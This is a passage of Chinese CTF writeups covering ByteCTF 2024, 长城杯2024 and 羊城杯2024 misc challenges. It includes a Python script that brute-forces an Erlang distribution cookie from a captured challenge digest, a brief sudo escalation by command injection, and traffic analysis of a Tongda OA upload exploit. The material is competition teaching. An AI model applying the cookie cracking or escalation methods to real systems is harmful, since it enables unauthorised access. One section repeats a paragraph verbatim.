-l看看能干什么</p><figure><imgsrc="/images/ByteCTF2024初赛-部分Misc-复现/image-20240923002541504.png"alt="image-20240923002541504" /><figcaption aria-hidden="true">image-20240923002541504</figcaption></figure><p>这里是程序进行了检测是否是终端而我们是shell导致的没法使用sudo，获取ptyify将我们转化为伪终端会话。</p><figure><imgsrc="/images/ByteCTF2024初赛-部分Misc-复现/image-20240923003112221.png"alt="image-20240923003112221" /><figcaption aria-hidden="true">image-20240923003112221</figcaption></figure><p>在数组的索引中插入命令，利用truegame.sh读取flag</p><figure><imgsrc="/images/ByteCTF2024初赛-部分Misc-复现/image-20240923003343716.png"alt="image-20240923003343716" /><figcaption aria-hidden="true">image-20240923003343716</figcaption></figure><h3 id="guess-cookie">Guess Cookie</h3><p>题目要求提交重要通信的cookie的md5值</p><p>流量包中有很多用来混淆的cookie，但是显然这里要找的是erlang cookie</p><p>过滤erldp协议，可以看到很多send challenge的操作</p><figure><imgsrc="/images/ByteCTF2024初赛-部分Misc-复现/image-20240923235751542.png"alt="image-20240923235751542" /><figcaption aria-hidden="true">image-20240923235751542</figcaption></figure><p>在github上可以找到有用来爆破erlang cookie的<ahref="https://github.com/gteissier/erl-matter">脚本</a></p><p>由于这里不需要远程交互，可以直接从流量包中提取到challenge和digest，因此需要对bruteforce-erldp稍作一下修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> erldp <span class="keyword">import</span> authenticate</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> islice</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate</span>(<span class="params">cookie_bytes, challenge</span>):</span><br><span class="line">  md5_hash = hashlib.md5()</span><br><span class="line">  md5_hash.update(cookie_bytes)</span><br><span class="line">  md5_hash.update(<span class="built_in">str</span>(challenge).encode())</span><br><span class="line">  digest = md5_hash.hexdigest()</span><br><span class="line">  <span class="keyword">return</span> digest == <span class="string">&quot;f0e2967976d3ad1d0e8d2e85e7146f1a&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_interval</span>(<span class="params">arg</span>):</span><br><span class="line">  elms = arg.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">  <span class="keyword">assert</span>(<span class="built_in">len</span>(elms) == <span class="number">3</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">int</span>(elms[<span class="number">0</span>], <span class="number">0</span>), <span class="built_in">int</span>(elms[<span class="number">1</span>], <span class="number">0</span>), <span class="built_in">float</span>(elms[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_distribution</span>(<span class="params">arg</span>):</span><br><span class="line">  intervals = []</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(arg, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obj = json.load(f)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> obj:</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;start&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;stop&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;prob&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      intervals.append((item[<span class="string">&#x27;start&#x27;</span>], item[<span class="string">&#x27;stop&#x27;</span>], item[<span class="string">&#x27;prob&#x27;</span>]))</span><br><span class="line">  <span class="keyword">return</span> intervals</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">walk_intervals</span>(<span class="params">intervals</span>):</span><br><span class="line">  <span class="keyword">for</span> (start, stop, prob) <span class="keyword">in</span> <span class="built_in">sorted</span>(intervals, key=<span class="keyword">lambda</span> x: x[<span class="number">2</span>], reverse=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(start, stop):</span><br><span class="line">      <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_random</span>(<span class="params">x</span>): <span class="keyword">return</span> (x*<span class="number">17059465</span> + <span class="number">1</span>) &amp; <span class="number">0xfffffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_cookie</span>(<span class="params">seed, size</span>):</span><br><span class="line">  x = seed</span><br><span class="line">  cookie = <span class="built_in">bytearray</span>(<span class="string">b&#x27;0&#x27;</span>*size)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    x = next_random(x)</span><br><span class="line">    cookie[i] = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + ((<span class="number">26</span>*x) // <span class="number">0x1000000000</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batched</span>(<span class="params">iterable, n</span>):</span><br><span class="line">  <span class="string">&quot;Batch data into tuples of length n. The last batch may be shorter.&quot;</span></span><br><span class="line">  <span class="comment"># batched(&#x27;ABCDEFG&#x27;, 3) --&gt; ABC DEF G</span></span><br><span class="line">  <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;n must be at least one&#x27;</span>)</span><br><span class="line">  it = <span class="built_in">iter</span>(iterable)</span><br><span class="line">  <span class="keyword">while</span> batch := <span class="built_in">tuple</span>(islice(it, n)):</span><br><span class="line">    <span class="keyword">yield</span> batch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">derive_and_authenticate</span>(<span class="params">seed, challenge</span>):</span><br><span class="line">  cookie = derive_cookie(seed, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">  success = authenticate(cookie,challenge)</span><br><span class="line">  <span class="keyword">if</span> success:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] seed=<span class="subst">&#123;seed:#x&#125;</span> cookie=<span class="subst">&#123;cookie.decode()&#125;</span>&#x27;</span>)</span><br><span class="line">    (r, w) = success</span><br><span class="line">    w.close()</span><br><span class="line">    <span class="keyword">await</span> w.wait_closed()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">amain</span>(<span class="params">intervals, sim, target, port</span>):</span><br><span class="line">  <span class="keyword">for</span> seeds <span class="keyword">in</span> batched(walk_intervals(intervals), sim):</span><br><span class="line">    tasks = [asyncio.create_task(derive_and_authenticate(seed, <span class="number">0x60ea7bde</span>)) <span class="keyword">for</span> seed <span class="keyword">in</span> seeds]</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">  parser = argparse.ArgumentParser()</span><br><span class="line">  mutual = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--interval&#x27;</span>, action=<span class="string">&#x27;append&#x27;</span>, <span class="built_in">type</span>=parse_interval)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--distribution&#x27;</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--seed-full-space&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--sim&#x27;</span>, default=<span class="number">16</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">  parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Erlang node address or FQDN&#x27;</span>)</span><br><span class="line">  parser.add_argument(<span class="string">&#x27;port&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;Erlang node TCP port&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> args.seed_full_space:</span><br><span class="line">    intervals = [parse_interval(<span class="string">&#x27;300000000,500000000,1000&#x27;</span>)]</span><br><span class="line">  <span class="keyword">elif</span> args.distribution:</span><br><span class="line">    intervals = parse_distribution(args.distribution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    intervals = args.interval</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">  asyncio.run(amain(intervals, args.sim, args.target, args.port))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>挂着跑一段时间即可得到结果</p><figure><imgsrc="/images/ByteCTF2024初赛-部分Misc-复现/image-20240924000420546.png"alt="image-20240924000420546" /><figcaption aria-hidden="true">image-20240924000420546</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> ByteCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯2024初赛 misc Writeup</title>
      <link href="/posts/5270d108/"/>
      <url>/posts/5270d108/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近打的所有比赛中，misc最简单的一次(</p><p>但是由于是两个misc手+一个re手组队，局限性可想而知。。。在这记录一下三道misc题</p></blockquote><h2 id="brickgame">BrickGame</h2><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908192223654.png"alt="image-20240908192223654" /><figcaption aria-hidden="true">image-20240908192223654</figcaption></figure><p>直接玩通关即可</p><h2 id="漏洞探踪流量解密">漏洞探踪，流量解密</h2><h3 id="第一阶段">第一阶段</h3><p>经过查看流量与在网上搜索，可以发现这是<ahref="https://www.cnblogs.com/T0uch/p/12580789.html">通达OA的洞</a>。根据其原理，可以在给出的日志中搜索/ispirit/im/upload.php，找到攻击来源ip，也就是第二阶段的压缩包的密码192.168.30.234</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908194622178.png"alt="image-20240908194622178" /><figcaption aria-hidden="true">image-20240908194622178</figcaption></figure><h3 id="第二阶段">第二阶段</h3><p>根据漏洞的原理，可以知道接下来是通过/ispirit/interface/gateway.php路径的文件上传漏洞，我们直接在流量中过滤出用到这个路径的流</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908202627396.png"alt="image-20240908202627396" /><figcaption aria-hidden="true">image-20240908202627396</figcaption></figure><p>其中有一个流可以看到提示，使用的是RC4加密</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908203255737.png"alt="image-20240908203255737" /><figcaption aria-hidden="true">image-20240908203255737</figcaption></figure><p>还可以从此外的两个流中看到从192.168.1.5下载了一个叫做key的文件和一个叫做raw的文件，过滤出目标为192.168.1.5的流</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908203543604.png"alt="image-20240908203543604" /><figcaption aria-hidden="true">image-20240908203543604</figcaption></figure><p>追踪，可以找到密钥和密文</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908203638605.png"alt="image-20240908203638605" /><figcaption aria-hidden="true">image-20240908203638605</figcaption></figure><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908203713316.png"alt="image-20240908203713316" /><figcaption aria-hidden="true">image-20240908203713316</figcaption></figure><p>注意这里的密文前跟着密钥，删去以后解密即可得到flag</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908204010288.png"alt="image-20240908204010288" /><figcaption aria-hidden="true">image-20240908204010288</figcaption></figure><h2 id="最安全的加密方式">最安全的加密方式</h2><p>过滤http流，追踪一下，可以找到一个脚本和一个rar压缩包</p><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908205114377.png"alt="image-20240908205114377" /><figcaption aria-hidden="true">image-20240908205114377</figcaption></figure><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908205026982.png"alt="image-20240908205026982" /><figcaption aria-hidden="true">image-20240908205026982</figcaption></figure><p>导出以后经过尝试，脚本中的pass就是rar压缩包的密码，解压得到大量的md5值。</p><p><img src="/images/长城杯2024初赛-misc-Writeup/image-20240908205742264.png" alt="image-20240908205742264" style="zoom:50%;" /></p><p>在cmd5上查了几行可以看出来，这是对flag进行了逐字符求md5值，写个脚本生成一个字典查询拼接即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5_dict</span>():</span><br><span class="line"></span><br><span class="line">    md5_dict = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ascii_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">        char = <span class="built_in">chr</span>(ascii_code)</span><br><span class="line">    </span><br><span class="line">        hash_object = hashlib.md5(char.encode())</span><br><span class="line">        md5_hash = hash_object.hexdigest()</span><br><span class="line">        md5_dict[md5_hash] = char</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> md5_dict</span><br><span class="line"></span><br><span class="line">md5_dict = generate_md5_dict()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    s+=md5_dict[a]</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/长城杯2024初赛-misc-Writeup/image-20240908210036787.png"alt="image-20240908210036787" /><figcaption aria-hidden="true">image-20240908210036787</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 长城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2024初赛 Writeup</title>
      <link href="/posts/805e7875/"/>
      <url>/posts/805e7875/</url>
      
        <content type="html"><![CDATA[<h2 id="writeup部分">Writeup部分</h2><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/羊城杯2024Writeup.pdf">Writeup点我</a></h4><p>Additional Statement:</p><p>written by <strong>X1cT34m</strong></p><h2 id="复现部分">复现部分</h2><blockquote><p>个人感觉这次羊城杯的misc实在是有点需要脑洞了，做到最后真的是感到穷途末路了，根本不知道接下来应该往什么方向走。。。现在看了其他师傅的wp，感到有的地方确实挺脑洞，但还是有的地方是自己的技术不过关，要学的还有很多。</p></blockquote><h3 id="checkin">Checkin</h3><p>下载下来的压缩包有个注释，是base58编码</p><p><img src="/images/羊城杯2024初赛-Writeup/image-20240828232334149.png" alt="image-20240828232334149" style="zoom:50%;" /></p><p><img src="/images/羊城杯2024初赛-Writeup/image-20240828232441329.png" alt="image-20240828232441329" style="zoom:50%;" /></p><p>FLag.txt中明显是某个文件的十六进制形式，cyberchef用hex转出来导入010可以看出这是个pcapng文件</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240828233209162.png"alt="image-20240828233209162" /><figcaption aria-hidden="true">image-20240828233209162</figcaption></figure><blockquote><p>当时比赛的时候就是卡在这里了。。。结果没想到接下来的某个步骤其实正好是我最近研究过的一个东西。。。</p></blockquote><p>前面的FLag.txt其实还藏着一层wbstego隐写，密码就是上面zip中的注释</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240828234413048.png"alt="image-20240828234413048" /><figcaption aria-hidden="true">image-20240828234413048</figcaption></figure><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240828234524260.png"alt="image-20240828234524260" /><figcaption aria-hidden="true">image-20240828234524260</figcaption></figure><p>一看就是SSLKEYLOGFILE，导入解密tls流量</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240828235009581.png"alt="image-20240828235009581" /><figcaption aria-hidden="true">image-20240828235009581</figcaption></figure><p>发现多出来的http流量中有个GIF，导出</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240828235420564.png"alt="image-20240828235420564" /><figcaption aria-hidden="true">image-20240828235420564</figcaption></figure><p>简单写个脚本可以发现得到的gif帧与帧之间间隔时间有两种，0.3和2.3，分别对应0和1，得到的二进制串转文本即可得到flag</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_gif_frames</span>(<span class="params">gif_file</span>):</span><br><span class="line">    im = Image.<span class="built_in">open</span>(gif_file)</span><br><span class="line">    im.seek(<span class="number">0</span>)</span><br><span class="line">    delay_times = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            delay_time = im.info.get(<span class="string">&#x27;duration&#x27;</span>, <span class="number">0</span>) / <span class="number">100.0</span></span><br><span class="line">            delay_times.append(delay_time)</span><br><span class="line">            im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> delay_times</span><br><span class="line">gif_file_path = <span class="string">&#x27;1.gif&#x27;</span></span><br><span class="line">delays = read_gif_frames(gif_file_path)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, delay <span class="keyword">in</span> <span class="built_in">enumerate</span>(delays):</span><br><span class="line">    <span class="comment">#print(delay)</span></span><br><span class="line">    <span class="keyword">if</span> delay==<span class="number">0.3</span>:</span><br><span class="line">        s+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829003649950.png"alt="image-20240829003649950" /><figcaption aria-hidden="true">image-20240829003649950</figcaption></figure><h3 id="miaoro">miaoro</h3><p>追踪tcp流，不难发现，GWHT中是请求，后面$$$...$$$之间的是返回的结果。在tcp流13处可以找到有用的东西</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829114444805.png"alt="image-20240829114444805" /><figcaption aria-hidden="true">image-20240829114444805</figcaption></figure><p>经过base64解码不难发现，这是一个倒置的zip文件</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829151126046.png"alt="image-20240829151126046" /><figcaption aria-hidden="true">image-20240829151126046</figcaption></figure><p>写个脚本回复一下这个zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;download.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f.readline()</span><br><span class="line">f.readline()</span><br><span class="line">f.readline()</span><br><span class="line">raw=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> a[:<span class="number">4</span>]!=<span class="string">&#x27;c8d0&#x27;</span>:</span><br><span class="line">    raw+=a[-<span class="number">16</span>:]</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">raw+=<span class="string">&#x27;4030b405&#x27;</span></span><br><span class="line">raw=raw[::-<span class="number">1</span>]</span><br><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(raw),<span class="number">2</span>):</span><br><span class="line">    ff.write(<span class="built_in">bytes</span>.fromhex(raw[j:j+<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><p>发现需要密码，再回到流量包去找，最终在tcp流10的GWHT中找到压缩包密码</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829151721392.png"alt="image-20240829151721392" /><figcaption aria-hidden="true">image-20240829151721392</figcaption></figure><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829151737624.png"alt="image-20240829151737624" /><figcaption aria-hidden="true">image-20240829151737624</figcaption></figure><p>解压出的图片看起来错位了，猜测是宽被修改过，这里将宽和高改成一样即可</p><p><img src="/images/羊城杯2024初赛-Writeup/image-20240829151911027.png" alt="image-20240829151911027" style="zoom:50%;" /></p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829152017519.png"alt="image-20240829152017519" /><figcaption aria-hidden="true">image-20240829152017519</figcaption></figure><p>得到的是猫猫编码，在网上可以找到<ahref="https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended%7Ccat%20alphabet">对照表</a>，对应着可以解出后半个flag：EBOFDELQDIAA}</p><p><img src="/images/羊城杯2024初赛-Writeup/image-20240829151911027.png" alt="image-20240829151911027" style="zoom:50%;" /></p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829152017519.png"alt="image-20240829152017519" /><figcaption aria-hidden="true">image-20240829152017519</figcaption></figure><p>得到的是猫猫编码，在网上可以找到<ahref="https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended%7Ccat%20alphabet">对照表</a>，对应着可以解出后半个flag：EBOFDELQDIAA}</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829152154193.png"alt="image-20240829152154193" /><figcaption aria-hidden="true">image-20240829152154193</figcaption></figure><blockquote><p>比赛的时候卡在了这儿，怎么也找不到前半个flag。。。对shiro_attack还是不熟悉。。。</p></blockquote><p>既然这题考了shiro_attack，那肯定得有点shiro的东西。前半个flag其实就藏在shiro的rememberMe里面，在这题里面叫作nekoMiao。</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829153223632.png"alt="image-20240829153223632" /><figcaption aria-hidden="true">image-20240829153223632</figcaption></figure><p>用工具解一下就可以看到前半个flag：DASCTF{B916CFEB-C40F-45D6-A7BC-</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829153349040.png"alt="image-20240829153349040" /><figcaption aria-hidden="true">image-20240829153349040</figcaption></figure><h3 id="z_misc">1z_misc</h3><blockquote><p>这题感觉是最抽象的一题，上来纯属猜谜。。。难就难在需要的脑洞太大了。。。反正我是被这个猜谜困住了（T0T)</p></blockquote><p>题目</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。</span><br><span class="line">若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。</span><br><span class="line">祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]</span><br></pre></td></tr></table></figure><p>另外还有一个压缩包</p><p>hint</p><p><img src="/images/羊城杯2024初赛-Writeup/e865c9738431f6d9b72e663f116f8dc.png" alt="e865c9738431f6d9b72e663f116f8dc" style="zoom:50%;" /></p><p>先来解释一下11和91。11的前一个1指的是地支的第一位子，后一个指的是子对应的三个星宿的第一位女；91的9指的是地支的第九位申，1指的是申对应的三个星宿的第一位觜。</p><p>再来解释一下1124和725。1124的11指的是地支的第十一位戌，24指的是从戌的第一位奎开始逆时针数二十四个正好到女；725的7指的是地支的第七位午，25指的是从午的第一位柳开始逆时针数25个正好到觜。</p><p>因此我们可以解密题目中给的数组，得到如下结果：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎</span><br></pre></td></tr></table></figure><p>总共只有三种元素，很容易想到摩斯电码，其中，心为.，胃为/，奎为-</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829161715362.png"alt="image-20240829161715362" /><figcaption aria-hidden="true">image-20240829161715362</figcaption></figure><p>这就是解题目给的压缩包的密码，解压得到一张hint.jpg和一个不明二进制文件flag。用010查看flag，再结合hint.jpg中提示的天琴座，不难猜到这是lyra隐写，将flag改名为flag.lyra。</p><figure><img src="/images/羊城杯2024初赛-Writeup/image-20240829162759993.png"alt="image-20240829162759993" /><figcaption 